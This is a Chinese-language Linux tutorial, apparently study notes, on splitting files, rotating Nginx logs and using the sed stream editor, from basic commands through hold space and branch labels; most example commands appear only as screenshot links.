对于容量已经很大的文件，我们可以使用split命令对文件进行切割，split命令支持以容量或者行数为单位切割文件。下面我们首先使用dd命令从/dev/urandom设备文件中复制随机数据到/root/test.txt文件，一次复制1MB的数据，复制500个1MB的数据。也就是新建一个容量为500MB的素材文件，接着我们使用split命令对该文件进行切割操作。

![image-20220325224003480](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224003480.png)

![image-20220325224039968](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224039968.png)

![image-20220325224050403](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224050403.png)

split语法格式如下。

![image-20220325224108112](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224108112.png)

什么参数都不指定时，split默认会以1000行为标准对文件进行切割，默认输出文件名的前缀为x，当没有输入文件名时也支持读取标准输入中的数据。如果按容量切割，10MB=10*1024*1024B, KB、MB、GB、TB、PB、EB等单位为1024的倍数，而kB、mB等单位为1000的倍数。

![image-20220325224316060](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224316060.png)

![image-20220325224348638](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224348638.png)

但是这种切割方法，让原本为一行的内容被切割为了多行，而一行从中间切割时是没有换行符的，因此输出12后屏幕没有换行，其他数据行都会有类似的问题。

![image-20220325224415526](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224415526.png)

对于这样的问题，我们可以选择使用行对文件进行切割，或者使用-C选择按行为单位的最大容量切割，如-C 10K，系统就会把文件切割为10KB左右的文件，但切割的时候会保证文件行内容的完整性，因此切割出来的文件不一定都是标准的10KB的

Split命令虽然可以让我们根据自己的需求将大文件切割为若干小文件，但是对于Nginx日志文件这样的案例，每次都需要手动使用split命令切割文件并不是最优方案，这是一种事后的弥补措施，我们还需要一种机制，可以在文件变大之前就将日志文件进行分割

我们可以使用脚本结合计划任务定期自动将旧的日志文件重命名。但是，当我们使用mv将旧日志改名后，Nginx服务依然会将后期的日志内容写入重命名后的日志文件中，因为Nginx依据的是文件描述符将数据写入文件，而不是依据文件名写入数据，哪怕文件被重命名了，系统依然会将日志写入重命名后的文件。这就需要我们在将旧的日志文件重命名后，再通过kill命令向Nginx进程发送一个USR1的信号，Nginx进程在接收到该信号后，就会自动打开一个新日志文件，并将后期所有新的日志写入新的日志文件中。下面的脚本我们写到Nginx源码安装的标准目录下，具体完整的日志切割脚本如下。

![image-20220325224957989](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325224957989.png)

![image-20220325225157026](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220325225157026.png)

## 第6章 上古神兵利器sed

sed是贝尔实验室的Lee E. McMahon在1973年到1974年开发的流编辑器，sed是基于交互式行编辑器ed开发的软件，sed与ed一样也是行处理编辑器，在sed中搞清楚你需要编辑的是哪一行内容很重要，同时sed是最早开始支持正则表达式的工具之一。我们可以使用sed非常轻松地完成非交互式的文件编辑工作，包括但不限于对文件的增、删、改、查等操作。

### 6.1 sed基本指令

sed会逐行扫描输入的数据，并将读取的数据内容复制到缓冲区中，我们称之为模式空间，然后拿模式空间中的数据与给定的条件进行匹配，如果匹配成功则执行特定的sed指令，否则sed会跳过输入的数据行，继续读取后续的数据。默认情况下sed会把最终的数据结果通过标准输出显示在屏幕上。

![image-20220326152628193](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326152628193.png)

sed语法格式如下。

![image-20220326152638199](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326152638199.png)

sed常用的命令选项如表

![image-20220326152651981](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326152651981.png)

sed基本操作指令

![image-20220326153222309](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326153222309.png)

sed指令执行前需要先根据条件定位需要处理的数据行，如果没有指定定位条件，则默认sed会对所有数据行执行特定的指令。sed支持的数据定位方法如下表所示

![image-20220326153554050](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326153554050.png)

下面我们通过大量的案例练习来说明前面三个表格中的每个概念。

```
注意:
sed是逐行处理软件，我们可能仅输入了一条sed指令，但系统会将该指令应用在所有匹配的数据行上，因此相同的指令会被反复执行N次，这取决于匹配到的数据有几行。
```

![image-20220326153922535](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326153922535.png)

当没有指定条件时，默认会匹配所有的数据行，因此/etc/hosts文件有多少行p指令就被执行多少次，sed读取文件的第1行执行p指令将该行内容显示在屏幕上，接着读取文件的第2行继续执行p指令再将该行内容显示在屏幕上。但是，为什么最终每个数据行却打印显示了两次呢？因为哪怕没有p指令，sed也会默认将读取到的所有数据行显示在屏幕上，所以p指令数据行被打印显示了一次，接着sed默认又将读取的数据行再显示了一次，最终每行显示了两次。可以使用-n选项屏蔽sed默认的输出功能。关闭默认的输出功能后，所有的数据行将仅显示一次。

![image-20220326154008635](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326154008635.png)

![image-20220326154227983](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326154227983.png)

仅显示文件的第2行

![image-20220326154332804](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326154332804.png)

sed支持从管道读取数据

上面的命令当没有指定任何匹配条件时，sed将匹配所有的数据行。但是，sed也支持多种方式定位特定的数据行，直接写行号就是最直接的一种方式，其他如正则表达式等方式也很实用。满足条件的行才会执行sed指令，否则不做任何操作，sed继续读取文件下一行内容，直到文件结尾程序退出

![image-20220326154657042](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326154657042.png)

![image-20220326155031056](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326155031056.png)

![image-20220326155106395](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326155106395.png)

![image-20220326155211395](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326155211395.png)

![image-20220326155400745](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326155400745.png)

显示从1~5和后奇数的行

![image-20220326161316458](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326161316458.png)

除了直接使用行号，sed还支持使用正则表达式定位特定的数据行。上面这条命令会读取文件的第1行，使用正则表达式匹配是否包含root，如果包含root则执行p指令，否则不执行任何操作，sed继续读取下一行数据，重复按照条件匹配数据行直到读取文件结束。上面的结果说明/tmp/passwd文件中的第1行和第10行都包含root，其他所有行都没有包含root字符串。

![image-20220326161451423](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326161451423.png)

![image-20220326161539075](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326161539075.png)

上面这条命令可以匹配字母s开头，以：x结尾，中间包含任意三个字符的数据行，最后使用p指令将匹配的数据行显示在屏幕上。

![image-20220326161801996](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326161801996.png)

显示以http为开头的行

默认sed不支持扩展正则，如果希望使用扩展正则匹配数据，可以使用-r参数。

![image-20220326162000441](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326162000441.png)

![image-20220326162409187](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326162409187.png)

![image-20220326162537377](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326162537377.png)

![image-20220326162552713](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326162552713.png)

![image-20220326162731472](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326162731472.png)

sed程序使用=指令可以显示行号，结合条件匹配，可以显示特定数据行的行号。

![image-20220326162843829](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326162843829.png)

在sed中支持使用感叹号（!）对匹配的条件进行取反操作

![image-20220326163631354](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326163631354.png)

![image-20220326163934072](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326163934072.png)

再第一行后面添加数据

![image-20220326164010550](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164010550.png)

通过a指令添加新的数据行后，虽然在屏幕的输出结果中我们确实看到了添加的新数据，但是查看源文件后就会发现/tmp/hosts并没有实际发生变化，默认sed仅仅是在缓存区中修改了数据并显示在屏幕上，而源文件不会发生变化。如果希望直接修改源文件的话，可以使用-i选项，但是使用该选项修改文件后，万一修改错误，数据将无法被恢复。

![image-20220326164022256](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164022256.png)

![image-20220326164343916](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164343916.png)

下面这条命令会先将文件备份为后缀名称为．bak的文件，再修改源文件的内容，将/tmp/hosts文件的第2行删除，d指令是以行为单位进行删除的指令。

![image-20220326164424190](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164424190.png)

![image-20220326164529751](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164529751.png)

![image-20220326164655881](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164655881.png)

i再里面和a一个效果，不会修改资源文件。只会修改缓存

![image-20220326164932363](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326164932363.png)

上面这条命令是让sed正则匹配包含new的行后面添加新的temp line数据行。这里需要注意的是，a或者i指令后面的所有内容都会被理解为需要添加的数据内容，因此不可以再写其他指令，效果如下。为了不破坏原始数据，下面的演示都不再使用-i选项。

![image-20220326165601232](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326165601232.png)

这条sed命令先逐行读取文件，匹配包含new的行，并对匹配到的数据进行替换，将整行数据替换为line。

我们通过r指令可以将其他文件的内容读取并存入当前需要编辑的文件中。而w指令则将当前编辑的文件内容另存到其他文件中，如果目标文件已存在，则另存时会将目标文件的内容覆盖。

![image-20220326170017943](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326170017943.png)

为什么每行后面都有centos7这个内容呢？因为sed是逐行处理工具，在r指令的前面没有写匹配条件，则默认会匹配所有数据行，所以虽然只写了一个r指令读取/etc/hostname文件，但是这条指令会被反复执行N次，读取hosts文件的第1行会执行一次r指令，接着读取hosts文件的第2行又会执行一次r指令，依此类推，直到hosts文件读取结束时程序退出。所以我们看到的结果是每一行后面都追加了centos7。如果希望每行后面都追加主机名，可以在r指定前面添加匹配条件。

![image-20220326170349685](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326170349685.png)

![image-20220326170403575](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326170403575.png)

![image-20220326170521721](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326170521721.png)

![image-20220326170637542](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326170637542.png)

将/etc/shells文件的1～3行另存到/tmp/myhosts，如果/tmp/myhosts已经存在，该文件的所有内容会被覆盖。

正常情况下sed会在读取完所有数据行之后退出，但是我们可以随时使用q指令来提前退出sed。

![image-20220326171011002](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171011002.png)

![image-20220326171053550](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171053550.png)

在前面的案例中我们已经学习了使用c和d对数据行进行修改和删除操作，但是这两个指令都以行为单位，c会将整行内容都替换，d则将整行内容都删除。而在实际工作中我们经常需要的是将某个关键词替换（行中的部分内容替换），或者将某个关键词删除，此时就需要使用s指令来完成这样的工作。

![image-20220326171244627](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171244627.png)

上面这条命令在s前面没有写匹配条件，因此是匹配所有数据行。当sed读取test.txt文件的第1行时，对该行进行正则匹配hello，如果在该行数据中包含hello，则将hello替换为hi，接着读取第2行再次进行正则匹配，第2行没有hello，则不进行任何替换，继续读取下一行，依此类推，直到文件结束。

![image-20220326171437587](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171437587.png)

![image-20220326171525685](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171525685.png)

上面这条命令会逐行读取test.txt文件内容，将小写的字母o替换为大写字母O，但是我们会发现如果一行中有多个字母o,sed默认仅仅会将第一个字母o替换为大写。如果需要替换每行中所有的小写字母o，则需要在s指令的末尾追加一个g标记，当然也运行我们追加一个具体的数据，表示对第几个字母o进行替换操作。

![image-20220326171623480](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171623480.png)

![image-20220326171735657](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171735657.png)

![image-20220326171922904](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326171922904.png)

在s替换指令的最后添加i标记可以忽略大小写，上面这条命令可以将大小写的jacob都转换为vicky。

![image-20220326172645035](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326172645035.png)

使用s替换指令时如果同时添加了e标记，则表示将替换后的内容当成Shell命令在终端执行一次。上面第一条sed命令是将/etc/hosts替换为ls -l /etc/hosts，替换后在命令终端执行ls-l /etc/hosts，因此屏幕输出的是该文件的详细信息。上面第二条sed命令是将tmpfile替换为touch /tmp/tmpfile，替换后在命令终端执行该命令

![image-20220326172826977](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326172826977.png)



![image-20220326175034447](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326175034447.png)

![image-20220326175340204](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326175340204.png)

上面这两个替换是有区别的，第一个替换是在匹配双引号开头双引号结尾和中间所有数据，并将其全部删除；而第二个替换仅仅是在匹配由一个引号开始，中间是不包含引号的任意其他字符（长度任意），最后是一个双引号结束的数据，这样当一行数据中包含多个引号数据时，就可以仅仅匹配第一个双引号的数据。

![image-20220326180050551](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326180050551.png)

上面这条命令应用了正则表达式中的保留功能，使用圆括号将匹配的数据保留，在后面通过\n调用前面保留的数据。这里在第一个圆括号中保留的是每行开头的第一个字符（．在正则中表示任意单个字符），在第三个圆括号中保留的是每行结束的最后一个字符，而在中间第二个圆括号中保留的是除首尾字符外中间的所有字符（.*在正则中表示任意长度的任意字符）。因为都是使用任意字符进行匹配，所以这三个括号可以匹配所有行的数据，并在后面将匹配的数据顺序进行重新调整再输出，将第三个括号的数据（\3）先输出，再输出第二个括号中的数据（\2），最后输出的是第一个括号中的数据（\1）。

在使用s指令进行替换时默认我们使用斜线（/）作为替换符号，但是当我们需要替换的内容本身包含斜线时就比较麻烦，需要对替换内容中的斜线使用右斜线（\）转义，这种情况下编写sed命令会很痛苦，读这样的代码更是让人崩溃。为了解决类似的问题，sed支持使用任何其他字符作为替换符号。

下面的案例我们希望将/sbin/nologin替换为/bin/sh。

![image-20220326180608432](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326180608432.png)

![image-20220326181056408](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326181056408.png)

箭头为转义字符

这样的命令不管是自己编写，还是让别人阅读都绝对如恶梦一般！下面我们将s指令的替换符号修改为其他字符试试。![image-20220326181331097](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326181331097.png)

![image-20220326181343077](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326181343077.png)

![image-20220326181351245](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326181351245.png)

使用sed时可以使用分号或者-e选项两种方式在一行中编写多条指令。可以直接使用分号将多个指令分隔，或者在多个-e参数后面添加sed指令，sed支持一个或多个-e参数。如果将分号放到花括号中还可以实现对指令进行分组。

![image-20220326190612912](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326190612912.png)

![image-20220326190624074](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326190624074.png)

![image-20220326191223574](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326191223574.png)

上面这两条命令在不使用分组功能时，系统会先找到包含world的行，然后将该行数据中的the删除，因为直接使用分号分隔了多条指令，匹配条件仅对第一个指令有效，第二个指令在没有匹配条件的情况下会匹配所有的数据行，只要数据行中包含the就删除，因此不使用分组时第一行和第四行的the都被删除了。而使用分组的最大好处就是在满足匹配条件时执行一组指令，而不满足匹配条件时不会执行这组指令，此时这个匹配条件会对分组中的所有指令有效，上面第二个sed会先找到包含world的行，然后针对这一行的数据将hello替换为hi，将the删除，因此最终仅对test.txt文件的第一行执行分组指令。

有些时候我们需要对文件进行的增、删、改比较多，虽然sed可以使用分号在一行中分隔多个指令，但是当指令很多时并不是很方便，对于指令比较多的情况，我们可以先将所有的sed指令写入一个文本文件中，然后通过sed的-f选项读取该指令文件即可实现多指令操作。

![image-20220326191929931](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326191929931.png)

![](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD\CD%5Cimage-20220326192920718.png)

以上指令的含义：匹配第一行数据后将整行内容替换为helloworld；匹配第二行数据，先显示该行中的所有数据，再将该行中的第一个小写字母g替换为大写字母G；/[0-9]/d使用正则匹配包含数据的行并将该行的所有数据都删除；最后使用正则匹配包含beijing的行，先将该行中第一个小写字母h替换为大写字母H，然后将该行中的beijing替换为china（仅对包含beijing的行执行两个s替换指令）。

![image-20220326193033486](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326193033486.png)

往test.txt里面的两行填充数字分析

![image-20220326193059486](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326193059486.png)

![image-20220326193115372](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326193115372.png)

可以看到无论那个行里面有什么  只要匹配出数字都会被删除

这就是/[0-9]/d的作用


### 6.2 sed高级指令

除了前面学习的基本指令，sed还支持很多更高级的指令，可以满足我们日常工作中更多的业务需求。

sed高级操作指令

![image-20220326193926657](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326193926657.png)

下面我们通过大量的案例练习来演示这些高级指令的使用方法。

sed在对数据进行编辑修改前需要先将读取的数据写入模式空间中，而sed除了有一个用于临时存储数据的模式空间，还设计有一个保留空间，保留空间中默认仅包含有一个回车符。前面我们学习的a、i、d、c、s等指令都仅用到了模式空间，而不会调用保留空间中的数据，仅当我们使用特定的指令时（如h、g、x等）才会用到保留空间中的数据，注意在保留空间中默认包含一个回车符。模式空间与保留空间的关系如下图

![image-20220326194406270](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326194406270.png)

模式空间与保留空间的关系

当我们使用h指令时，sed就会把模式空间中的所有内容复制到保留空间，并将保留空间中原有的回车符覆盖，而如果使用的是H指令，则sed会把模式空间中的所有内容追加到保留空间中回车符的后面，保留空间中的回车符不会被覆盖。反向操作时使用g指令，sed就会把保留空间中的所有数据复制到模式空间，此时模式空间中原有的所有数据都将被覆盖。而如果使用的是G指令，则sed就会把保留空间中的所有数据追加到模式空间原有数据的下面，模式空间中原有的数据不会被覆盖。如果需要将模式空间与保留空间中的数据直接交换则可以使用x指令。

![image-20220326194933654](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326194933654.png)

上面这条sed命令在读取文件的第2行时将整行数据复制到了保留空间，并将保留空间中原有的回车符覆盖了，然后在读取第5行数据时，使用保留空间中的数据覆盖掉模式空间中的数据（就是使用go spurs to覆盖替换了原来的I am Jacob）。

![image-20220326195015668](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326195015668.png)

这次我们使用的是大写字母G，是将保留空间中的数据追加到第5行的后面，因此在I am Jacob的后面添加了一行go spurs go。

![image-20220326195236535](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326195236535.png)

上面的命令因为使用的是大写字母H，是将第2行的数据追加到保留空间，保留空间中的回车符不会被覆盖，而到了读取第5行数据时，又使用大写字母G将保留空间中的数据追加到模式空间，因此在I am Jacob行的后面追加了一个回车符和一个gospurs go的数据行。

![image-20220326195249287](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326195249287.png)

上面使用回车符和go spurs go覆盖了文件原有的第5行的内容I am Jacob。

![image-20220326195321723](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326195321723.png)

上面在读取第2行数据时，先将数据复制到了保留空间，复制完成后，删除了第2行的数据，因此屏幕上不再显示文件原有的第2行数据（go spurs go）。但是这些数据并没有彻底消失，因为已经被复制到了保留空间，最后当sed读取到文件的第5行时，使用保留空间中的数据将第5行的内容覆盖掉。等于是将文件的第2行剪切到了文件的第5行，并将第5行数据覆盖。

![image-20220326195713249](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326195713249.png)

读取文件的第一行内容到模式空间，将该行数据复制到保留空间，当读取文件第4行时，执行x指令将模式空间与保留空间的数据互换，模式空间就变成了hello the world，保留空间就变成了I am Jacob。

![image-20220326195817874](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326195817874.png)

通过多次使用h指令可以将多个数据行都复制到保留空间以备后用，但是多次使用h指令复制数据时，需要使用大写H以防止后面复制的数据将前面复制的数据覆盖。

sed的正常流程是先读取数据行放入模式空间，然后匹配条件执行sed指令，如果有多个指令，则只有最后一个指令被执行后才会输出模式空间的内容，接着读取文件的下一行内容，依此类推，直到文件读取结束时退出sed程序。但是如果使用n（next）指令，则会改变这样的正常流程，sed遇到n指令会立刻输出当前模式空间中的内容，直接读取输入文件的下一行数据到模式空间。

![image-20220326200504843](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326200504843.png)

上面这条sed命令，因为没有匹配条件因此指令对所有数据行都有效，先是读取test.txt的第一行到模式空间，然后执行n会导致打印当前行的数据内容（显示第一行hello the world），接着读取文件下一行数据到模式空间（go spurs go），此时再执行d就会将刚刚读取进来的数据删除（删除go spurs go这行），最后当n和d指令都执行完毕了，接着sed继续读取文件下一行数据（读取第3行进入模式空间），依此类推，最终输出的效果就是将偶数行全部删除，屏幕仅显示奇数行的内容。

通过多行N指令也可以读取下一行数据到模式空间，并将新行内容添加到模式空间的现有内容之后，来创建一个多行的模式空间。模式空间的最初内容与新的输入行之间用换行符分隔。在模式空间中插入的换行符可以使用\n匹配。

![image-20220326201751657](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326201751657.png)

上面的命令当读取test.txt文件的第2行到模式空间后，先使用N读取下一行（第3行）追加到模式空间现有数据的后面，此时模式空间中就有了两行数据，使用l指令可以显示当前模式空间中的数据，并且与p指令不同，使用l指令可以打印出那些不可显示的控制字符，如换行符（\n）或回车符（$）之类的内容。如果使用的是p指令，则不会显示控制字符，而是将控制字符转换为实际的换行和回车符。

![image-20220326202046197](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326202046197.png)

sed支持多种替换操作，c以行为单位替换，s以关键词为单位替换，y以字符为单位替换，单个字符是sed中的最小处理单位。

![image-20220326214630781](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326214630781.png)

替换h为H，g为G

![image-20220326215040821](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326215040821.png)

替换h为1，g为2

![image-20220326215138479](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326215138479.png)

小写字母替换为大写

当有多个sed指令时默认会按顺序依次执行，如果我们需要打破这种限制，让多个指令按照我们希望的顺序执行，则可以使用sed提供的标签功能，定义标签后可以使用分支（branch）或者测试（test）控制sed指令回到特定的标签位置

首先我们需要明确定义标签需要使用冒号（:）开始，后面跟任意标签字符串（标签名称），冒号与标签字符串之间不能有空格，而如果字符串最后有空格，则空格也被理解为标签名称的一部分。

有了标签，我们就可以通过b或者t指令跳转至标签的位置，如果b或者t指令跳转的目标标签不存在，则sed直接跳转至命令结束位置。区别是b为无条件跳转，t为有条件跳转。t需要根据前面的s替换指令的结果决定是否跳转。需要注意的是，这里的跳转只影响sed指令的执行顺序，对输入的数据行没有影响。

Branch无条件跳转，基本语法格式如下。

![image-20220326215721909](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326215721909.png)

test有条件跳转，基本语法格式如下。

![image-20220326215739307](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326215739307.png)

示例演示

![image-20220326220545638](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326220545638.png)

上面这条命令在打印行号（=）和打印当前行数据内容（p）之前定义了一个名称为top的标签，并在读取文件第4行数据时将sed指令跳转至top，循环执行=和p指令。针对test.txt文件指令的执行流程如下。

（1）读取文件的第1行数据，定义名称为top的标签，执行=和p指令，屏幕输出行号1和第1行的数据内容"1:hello theworld."，因为第1行的行号不等于4，所以此时不会执行b跳转指令。

（2）接着读取文件的第2行数据，与第1行的情况相同，屏幕输出行号2和第2行的数据内容"2:go spurs go."。

（3）接着读取文件的第3行数据，与第1行的情况依然相同，屏幕输出行号3以及第三行的数据内容"3:123456 789."。

（4）再读取文件的第4行数据，与前面类似的情况是，依然会按顺序执行=和p指令，屏幕显示行号4和该行的数据内容"4:hello the beijing."，但不同的是，第4行的行号与b指令前面的行号条件匹配，因此在这里就会执行b跳转指令，将指令跳转至top，等于做了一次循环。回到top后，再按顺序执行=和p指令，因为跳转影响的仅仅是指令的执行顺序，不会导致数据行的跳转变化，所以当前行始终都是第4行，4b的条件匹配始终满足，b指令会反复跳转至top导致死循环。

（5）上面的命令因为使用了head仅查看命令的前14行输出，如果把最后的管道head去掉，仅保留前面的sed命令，则这条命令是一个永不退出的死循环命令。

![image-20220326221234617](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326221234617.png)

上面这条命令是在打印数据行内容（p指令）前定义了一个名称为label的标签，当匹配到有包含go的数据行时就将指令直接跳转至label标签。也就是说在正常情况下应该每读取一行数据就显示行号和打印数据内容，但是当遇到包含go字符串的行时，就跳过了=显示行号的指令，直接跳到了标签为label的位置，然后执行p指令打印数据行内容。针对test.txt文件指令的执行流程如下。

（1）读取文件的第1行，因为第1行不包含go字符串，因此不会执行b跳转指令，就正常执行=和p指令，屏幕显示行号和数据行的内容"1:hello the world."。

（2）读取文件的第2行，因为该行数据包含go字符串，因此b指令被触发执行，sed直接跳过=指令，跳转到了名称为label的位置，也就是p指令前面，这样对于第2行而言最终仅仅是显示该行的数据内容："2:go spurs go."，不会再多显示一次行号。

（3）后面的所有数据行，都与第1行一样，都会正常地打印行号，并显示对应行的数据内容，直到文件读取完毕，sed程序退出。

![image-20220326222112642](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326222112642.png)

结尾句号(点)替换为感叹号

![image-20220326222211682](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326222211682.png)

与前面的案例类似，上面这条命令，当匹配包含beijing的行时，就会跳过替换执行，直接通过b指令跳转至命令结尾位置，然后其他所有数据行的句号都被替换为感叹号，唯独包含beijing字符串的行不会进行任何替换操作。

![image-20220326222711355](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326222711355.png)

![image-20220326223325719](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326223325719.png)

上面这条命令仅仅会将文件中出现的第一个hello替换为nihao，在没有匹配包含hello的行时花括号中的指令都不会被触发执行，sed会正常地逐行读取文件每行的数据到模式空间，当与/hello/条件不匹配时就接着读取下一行数据。但是，一旦某一行数据与正则/hello/匹配了，就会触发花括号中的指令，而花括号中的第一个指令就是将hello替换为nihao。接着定义了一个名称为next的标签，定义标签不会对文件的数据产生任何影响，然后通过n指令读取下一行数据到模式空间，到此如果后面没有b next指令，则所有的sed指令都已经执行完毕，sed就会按正常流程自动逐行读取接下来的每行数据，并将数据再次与/hello/匹配。如果匹配又会执行将hello替换为nihao的操作，而我们的目标仅仅是希望替换文件中第一个出现的hello，因此不能让sed正常地去按照流程逐行读取数据与/hello/匹配。那么上面命令中最后的b next就至关重要了，它可以确保在匹配了包含hello的数据行后，仅执行一次将hello替换为nihao的操作，接着就是死循环执行n指令将整个文件全部读取出来，当所有数据都读取完毕后，sed程序结束。

创建一个测试文件

![image-20220326224056442](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326224056442.png)

现在我们需要将多行数据合并为一行，并且将多余的空格删除。

![image-20220326224235088](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220326224235088.png)

把换行转换为null，”： +“转换为”： “

但是当我们将素材数据修改为如下效果时，第一种方式就无法满足我们的需求了。

